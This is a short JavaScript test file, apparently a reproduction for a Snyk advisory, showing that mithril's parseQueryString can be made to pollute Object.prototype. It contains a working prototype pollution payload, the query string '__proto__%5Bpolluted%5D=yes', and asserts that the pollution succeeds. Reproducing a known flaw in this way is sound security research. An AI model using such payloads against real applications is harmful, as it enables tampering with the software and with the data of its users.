//https://snyk.io/vuln/SNYK-JS-MITHRIL-460113
test("prototype pollution in mithril", () => {
  require("mithril/test-utils/browserMock")(global);
  const m = require("mithril");
  obj = {};

  expect({}.polluted).toBe(undefined);

  m.parseQueryString("__proto__%5Bpolluted%5D=yes");
  expect({}.polluted).toBe("yes");
});
